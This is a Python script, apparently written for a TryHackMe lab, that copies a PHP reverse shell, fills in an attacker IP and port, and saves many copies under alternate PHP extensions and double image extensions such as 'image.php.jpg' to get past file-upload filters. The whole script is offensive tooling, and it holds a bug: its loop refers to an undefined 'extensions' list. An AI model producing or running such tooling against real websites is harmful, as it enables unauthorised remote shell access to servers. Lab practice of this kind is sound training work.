import argparse
import os
import shutil


def main(args):
    # copy the original to shells/shell.php
    shells_dir = 'shells'
    shell_file = 'shell.php'
    os.makedirs(shells_dir)
    base_filename = os.path.join(shells_dir, shell_file)
    shutil.copy(args.shell_path, base_filename)
    # replace the ip and port with what was provided
    with open(base_filename, 'r') as fp:
        text = fp.read()
    text = text.replace("$ip = 'PUT_THM_ATTACKBOX_IP_HERE';  // CHANGE THIS",
                              f"$ip = '{args.host}';  // CHANGE THIS")
    text = text.replace("$port = 1234;       // CHANGE THIS",
                              f"$port = {args.port};       // CHANGE THIS")
    with open(base_filename, 'w') as fp:
        fp.write(text)
    # duplicate shell using different php extensions
    php_extensions = [".php3", ".php4", ".php5", ".php7", ".phtml", ".phps", ".pht", ".phar"]
    for ext in extensions:
        new_file = os.path.join(shells_dir, f"shell{ext}")
        shutil.copy(base_filename, new_file)
    # duplicate shell with different image extensions
    images = ['jpg', 'jpeg', 'png', 'gif', 'tiff', 'bmp', 'svg']
    for ext in images:
        new_file = os.path.join(shells_dir, f"image.php.{ext}")
        shutil.copy(base_filename, new_file)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='A script create multiple reverse shell files')
    parser.add_argument('host', help='The host name of the attacker machine.')
    parser.add_argument('--port', type=int, default=4444, help='The port of the attacker machine.')
    parser.add_argument('--shell-path', type=str, default='/usr/share/webshells/php/php-reverse-shell.php', help='The path of the original shell')
    args = parser.parse_args()
    main(args)
